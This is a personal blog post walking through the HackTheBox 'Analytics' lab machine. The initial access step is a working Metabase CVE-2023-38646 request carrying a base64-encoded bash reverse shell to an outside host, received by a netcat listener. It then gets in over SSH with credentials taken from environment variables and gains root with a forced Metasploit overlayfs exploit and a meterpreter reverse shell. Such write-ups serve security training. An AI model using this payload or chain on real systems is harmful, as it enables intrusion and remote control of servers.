---
title: HackTheBox - Analytics
tags: 
    - htb
    - nmap
    - metasploit
    - metabase
    - cve-2023-38646
    - rce
    - reverse shell
    - cve-2021-3493
    - linux
category:
    - ctf
---
Welcome to my [blog](https://rashidmya.dev/)! This is my very first post.


## Getting User

### Network scan

Starting off with a SYN scan, when we see port 80, it tells us that there is probably a web server running.

{% vimhl bash %}
┌──(kali㉿kali)-[~]
└─$ sudo nmap -sS -oA HTB/Analytics/nmap/initial_syn_scan 10.10.11.233 
[sudo] password for kali: 
Starting Nmap 7.94 ( https://nmap.org ) at 2023-10-14 02:01 EDT
Nmap scan report for 10.10.11.233
Host is up (0.15s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
{% endvimhl %}

<br>
Opening a browser and accessing 10.10.11.233 redirects us to the domain analytical.htb. The next step is to add that domain to /etc/hosts in order to access the website.

{% vimhl bash %}
┌──(kali㉿kali)-[~]
└─$ sudo vim /etc/hosts
127.0.0.1       localhost
127.0.1.1       kali
::1             localhost ip6-localhost ip6-loopback
ff02::1         ip6-allnodes
ff02::2         ip6-allrouters
10.10.11.233    analytical.htb
{% endvimhl %}

<br>
Now that I'm able to access the website, we're going to do a default script scan. 
However, it didn't give us anything useful.

{% vimhl bash %}
┌──(kali㉿kali)-[~]
└─$ sudo nmap -sV -sC -oA HTB/Analytics/nmap/default_script_scan 10.10.11.233
Starting Nmap 7.94 ( https://nmap.org ) at 2023-10-14 02:11 EDT
Nmap scan report for analytical.htb (10.10.11.233)
Host is up (0.15s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)
|_  256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Analytical
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
{% endvimhl %}

<br>
Going through the website, there's a Login page that takes us to the URL data.analytical.htb which we will also add to /etc/hosts file.

{% vimhl bash %}
10.10.11.233    analytical.htb data.analytical.htb
{% endvimhl %}

<br>

### Exploit

Viewing the source code of the login page, we see it is embedded in JSON object and using Metabase v0.46.6, and a bit of research shows us it has a vulnerability CVE-2023-38646 which is Pre-Auth RCE.
First, we'll listen to the port using `nc`.
{% vimhl bash %}
┌──(kali㉿kali)-[~]
└─$ nc -lnvp 9998
{% endvimhl %}

<br>
By creating this POST request, we are able to get a reverse shell.

{% vimhl bash %}
POST /api/setup/validate HTTP/1.1
Host: data.analytical.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: application/json,
Connection: close
Content-Type: application/json
Content-Length: 522
{"details": {"details": {"advanced-options": true, "classname": "org.h2.Driver", "subname": "zip:/app/metabase.jar!/sample-database.db;MODE=MSSQLServer;TRACE_LEVEL_SYSTEM_OUT=1\\;CREATE TRIGGER pwnshell BEFORE SELECT ON INFORMATION_SCHEMA.TABLES AS $$//javascript\njava.lang.Runtime.getRuntime().exec('bash -c {echo,YmFzaCAtaSA+Ji9kZXYvdGNwLzEwLjEwLjE0LjE2Lzk5OTggMD4mMQ==}|{base64,-d}|{bash,-i}')\n$$--=x", "subprotocol": "h2"}, "engine": "postgres", "name": "x"}, "token":   "249fa03d-fd94-4d5b-b94f-b4ebf3df681f"}
{% endvimhl %}

You can look up the token in the page source by finding setup-token.
YmFzaCAtaSA+Ji9kZXYvdGNwLzEwLjEwLjE0LjE2Lzk5OTggMD4mMQ== decoded is `bash -i >&/dev/tcp/10.10.14.16/9998 0>&1`
<br>
Now that I have a shell, I went digging into the machine and found out that `env` contains credentials

{% vimhl bash %}
MB_LDAP_BIND_DN=
LANGUAGE=en_US:en
USER=metabase
HOSTNAME=816f7160608a
FC_LANG=en-US
SHLVL=6
LD_LIBRARY_PATH=/opt/java/openjdk/lib/server:/opt/java/openjdk/lib:/opt/java/openjdk/../lib
HOME=/home/metabase
OLDPWD=/
MB_EMAIL_SMTP_PASSWORD=
LC_CTYPE=en_US.UTF-8
JAVA_VERSION=jdk-11.0.19+7
LOGNAME=metabase
_=/bin/busybox
MB_DB_CONNECTION_URI=
PATH=/opt/java/openjdk/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
MB_DB_PASS=
MB_JETTY_HOST=0.0.0.0
META_PASS=An4lytics_ds20223#
LANG=en_US.UTF-8
MB_LDAP_PASSWORD=
SHELL=/bin/sh
MB_EMAIL_SMTP_USERNAME=
MB_DB_USER=
META_USER=metalytics
LC_ALL=en_US.UTF-8
JAVA_HOME=/opt/java/openjdk
PWD=/tmp
MB_DB_FILE=//metabase.db/metabase.db
{% endvimhl %}

<br>
Using the credentials, we can now login to SSH and get the user flag

{% vimhl bash %}
META_USER=metalytics
META_PASS=An4lytics_ds20223#
{% endvimhl %}

<br>

## Getting Root

### Information Gathering

Now that we're in the machine, I'm going to try to get some information about it
{% vimhl bash %}
metalytics@analytics:/tmp$ find / -perm -u=s -type f 2>/dev/null
/usr/bin/newgrp
/usr/bin/gpasswd
/usr/bin/su
/usr/bin/umount
/usr/bin/chsh
/usr/bin/fusermount3
/usr/bin/sudo
/usr/bin/passwd
/usr/bin/mount
/usr/bin/chfn
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
/usr/libexec/polkit-agent-helper-1
{% endvimhl %}

{% vimhl bash %}
metalytics@analytics:/tmp$ cat /etc/os-release
PRETTY_NAME="Ubuntu 22.04.3 LTS"
NAME="Ubuntu"
VERSION_ID="22.04"
VERSION="22.04.3 LTS (Jammy Jellyfish)"
VERSION_CODENAME=jammy
ID=ubuntu
ID_LIKE=debian
HOME_URL="https://www.ubuntu.com/"
SUPPORT_URL="https://help.ubuntu.com/"
BUG_REPORT_URL="https://bugs.launchpad.net/ubuntu/"
PRIVACY_POLICY_URL="https://www.ubuntu.com/legal/terms-and-policies/privacy-policy"
UBUNTU_CODENAME=jammy
{% endvimhl %}

### Privileprige Escalation

<br>
I'm going to run metasploit to look for payloads I could try

{% vimhl bash %}
msf6 > search ubuntu
Matching Modules
================
   #    Name                                                                Disclosure Date  Rank       Check  Description
   -    ----                                                                ---------------  ----       -----  -----------
   0    exploit/linux/local/cve_2021_3493_overlayfs                         2021-04-12       great      Yes    2021 Ubuntu Overlayfs LPE
   1    exploit/linux/local/af_packet_chocobo_root_priv_esc                 2016-08-12       good       Yes    AF_PACKET chocobo_root Privilege Escalation
   2    exploit/linux/local/af_packet_packet_set_ring_priv_esc              2017-03-29       good       Yes    AF_PACKET packet_set_ring Privilege Escalation
   3    exploit/multi/browser/adobe_flash_nellymoser_bof                    2015-06-23       great      No     Adobe Flash Player Nellymoser Audio Decoding Buffer Overflow
   4    exploit/multi/browser/adobe_flash_net_connection_confusion          2015-03-12       great      No     Adobe Flash Player NetConnection Type Confusion
   5    exploit/linux/misc/aerospike_database_udf_cmd_exec                  2020-07-31       great      Yes    Aerospike Database UDF Lua Code Execution
   6    exploit/linux/misc/cve_2020_13160_anydesk                           2020-06-16       normal     Yes    AnyDesk GUI Format String Write
   7    auxiliary/scanner/http/apache_activemq_source_disclosure                             normal     No     Apache ActiveMQ JSP Files Source Disclosure
   8    exploit/multi/http/apache_flink_jar_upload_exec                     2019-11-13       excellent  Yes    Apache Flink JAR Upload Java Code Execution
   9    auxiliary/scanner/http/apache_flink_jobmanager_traversal            2021-01-05       normal     Yes    Apache Flink JobManager Traversal
   10   exploit/linux/smtp/apache_james_exec                                2015-10-01       normal     Yes    Apache James Server 2.3.2 Insecure User Creation Arbitrary File Write
   11   exploit/multi/http/apache_roller_ognl_injection                     2013-10-31       excellent  Yes    Apache Roller OGNL Injection
   12   exploit/multi/http/struts_dev_mode                                  2012-01-06       excellent  Yes    Apache Struts 2 Developer Mode OGNL Execution
   13   exploit/linux/local/tomcat_ubuntu_log_init_priv_esc                 2016-09-30       manual     Yes    Apache Tomcat on Ubuntu Log Init Privilege Escalation
   14   exploit/linux/local/apport_abrt_chroot_priv_esc                     2015-03-31       excellent  Yes    Apport / ABRT chroot Privilege Escalation
..............................
{% endvimhl %}

I'm going to try the first payload, which is Overlayfs LPE

{% vimhl bash %}
msf6 > use 0
[*] No payload configured, defaulting to linux/x64/meterpreter/reverse_tcp
msf6 exploit(linux/local/cve_2021_3493_overlayfs) > show optons
[-] Invalid parameter "optons", use "show -h" for more information
msf6 exploit(linux/local/cve_2021_3493_overlayfs) > show options
Module options (exploit/linux/local/cve_2021_3493_overlayfs):
   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   COMPILE  Auto             yes       Compile on target (Accepted: Auto, True, False)
   SESSION                   yes       The session to run this module on
Payload options (linux/x64/meterpreter/reverse_tcp):
   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  192.168.142.128  yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port
Exploit target:
   Id  Name
   --  ----
   0   x86_64
View the full module info with the info, or info -d command.
msf6 exploit(linux/local/cve_2021_3493_overlayfs) >
{% endvimhl %}

we need to establish an SSH session before we use it
{% vimhl bash %}
msf6 exploit(linux/local/cve_2021_3493_overlayfs) > use auxiliary/scanner/ssh/ssh_login
msf6 auxiliary(scanner/ssh/ssh_login) > show options
Module options (auxiliary/scanner/ssh/ssh_login):
   Name              Current Setting  Required  Description
   ----              ---------------  --------  -----------
   BLANK_PASSWORDS   false            no        Try blank passwords for all users
   BRUTEFORCE_SPEED  5                yes       How fast to bruteforce, from 0 to 5
   DB_ALL_CREDS      false            no        Try each user/password couple stored in the current database
   DB_ALL_PASS       false            no        Add all passwords in the current database to the list
   DB_ALL_USERS      false            no        Add all users in the current database to the list
   DB_SKIP_EXISTING  none             no        Skip existing credentials stored in the current database (Accepted: none, user, user&realm)
   PASSWORD                           no        A specific password to authenticate with
   PASS_FILE                          no        File containing passwords, one per line
   RHOSTS                             yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT             22               yes       The target port
   STOP_ON_SUCCESS   false            yes       Stop guessing when a credential works for a host
   THREADS           1                yes       The number of concurrent threads (max one per host)
   USERNAME                           no        A specific username to authenticate as
   USERPASS_FILE                      no        File containing users and passwords separated by space, one pair per line
   USER_AS_PASS      false            no        Try the username as the password for all users
   USER_FILE                          no        File containing usernames, one per line
   VERBOSE           false            yes       Whether to print output for all attempts
View the full module info with the info, or info -d command.
msf6 auxiliary(scanner/ssh/ssh_login) > set USERNAME metalytics
USERNAME => metalytics
msf6 auxiliary(scanner/ssh/ssh_login) > set PASSWORD An4lytics_ds20223#
PASSWORD => An4lytics_ds20223#
msf6 auxiliary(scanner/ssh/ssh_login) > set RHOST 10.10.11.233
RHOST => 10.10.11.233
msf6 auxiliary(scanner/ssh/ssh_login) > exploit
[*] 10.10.11.233:22 - Starting bruteforce
[+] 10.10.11.233:22 - Success: 'metalytics:An4lytics_ds20223#' 'uid=1000(metalytics) gid=1000(metalytics) groups=1000(metalytics) Linux analytics 6.2.0-25-generic #25~22.04.2-Ubuntu SMP PREEMPT_DYNAMIC Wed Jun 28 09:55:23 UTC 2 x86_64 x86_64 x86_64 GNU/Linux '
[*] SSH session 1 opened (10.10.14.16:44447 -> 10.10.11.233:22) at 2023-10-14 07:00:05 -0400
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf6 auxiliary(scanner/ssh/ssh_login) > sessions -l
Active sessions
===============
  Id  Name  Type         Information  Connection
  --  ----  ----         -----------  ----------
  1         shell linux  SSH kali @   10.10.14.16:44447 -> 10.10.11.233:22 (10.10.11.233)
{% endvimhl %}

{% vimhl bash %}
msf6 auxiliary(scanner/ssh/ssh_login) > use linux/local/cve_2021_3493_overlayfs
[*] Using configured payload linux/x64/meterpreter/reverse_tcp
msf6 exploit(linux/local/cve_2021_3493_overlayfs) > set SESSION 1
SESSION => 1
msf6 exploit(linux/local/cve_2021_3493_overlayfs) > set LHOST 10.10.14.16
LHOST => 10.10.14.16
msf6 exploit(linux/local/cve_2021_3493_overlayfs) > exploit
[*] Started reverse TCP handler on 192.168.142.128:4444 
[*] Running automatic check ("set AutoCheck false" to disable)
[-] Exploit aborted due to failure: not-vulnerable: The target is not exploitable. The target version 6.2.0 is outside the vulnerable version range 3.13-5.14 "set ForceExploit true" to override check result.
[*] Exploit completed, but no session was created.
msf6 exploit(linux/local/cve_2021_3493_overlayfs) > set ForceExploit true
ForceExploit => true
msf6 exploit(linux/local/cve_2021_3493_overlayfs) > exploit
[*] Started reverse TCP handler on 10.10.14.16:4444 
[*] Running automatic check ("set AutoCheck false" to disable)
[!] The target is not exploitable. The target version 6.2.0 is outside the vulnerable version range 3.13-5.14 ForceExploit is enabled, proceeding with exploitation.
[*] Writing '/tmp/.xM6J2mCaQB/.ML3YJAz' (17840 bytes) ...
[*] Writing '/tmp/.xM6J2mCaQB/.j63G9wDImt' (250 bytes) ...
[*] Launching exploit...
[*] Sending stage (3045380 bytes) to 10.10.11.233
[+] Deleted /tmp/.xM6J2mCaQB/.ML3YJAz
[+] Deleted /tmp/.xM6J2mCaQB
[*] Meterpreter session 2 opened (10.10.14.16:4444 -> 10.10.11.233:33034) at 2023-10-14 07:16:53 -0400

meterpreter >
{% endvimhl %}

It worked! now we can get the root flag
{% vimhl bash %}
meterpreter > cd /root
meterpreter > ls
Listing: /root
==============
Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
020666/rw-rw-rw-  0     cha   2023-10-14 07:10:52 -0400  .bash_history
100644/rw-r--r--  3106  fil   2021-10-15 06:06:05 -0400  .bashrc
040700/rwx------  4096  dir   2023-04-27 12:09:20 -0400  .cache
040755/rwxr-xr-x  4096  dir   2023-04-27 12:35:32 -0400  .local
100644/rw-r--r--  161   fil   2019-07-09 06:05:50 -0400  .profile
040755/rwxr-xr-x  4096  dir   2023-08-25 11:14:21 -0400  .scripts
100644/rw-r--r--  66    fil   2023-08-25 11:14:35 -0400  .selected_editor
040700/rwx------  4096  dir   2023-04-27 12:07:06 -0400  .ssh
100644/rw-r--r--  39    fil   2023-08-08 07:30:03 -0400  .vimrc
100644/rw-r--r--  165   fil   2023-08-08 07:53:02 -0400  .wget-hsts
100640/rw-r-----  33    fil   2023-10-14 07:11:11 -0400  root.txt
{% endvimhl %}
